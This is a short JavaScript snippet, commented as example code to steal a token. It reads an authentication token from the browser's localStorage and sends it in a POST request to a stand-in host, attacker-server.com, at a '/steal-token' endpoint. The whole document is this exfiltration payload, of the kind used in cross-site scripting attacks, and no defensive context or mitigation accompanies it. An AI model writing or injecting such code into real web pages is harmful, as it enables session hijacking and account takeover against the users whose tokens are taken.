// Example JavaScript code to steal token
(function() {
    var token = localStorage.getItem('token');
    if (token) {
        var xhr = new XMLHttpRequest();
        var url = "https://attacker-server.com/steal-token";
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log("Token sent successfully");
            }
        };
        var data = JSON.stringify({ token: token });
        xhr.send(data);
    }
})();
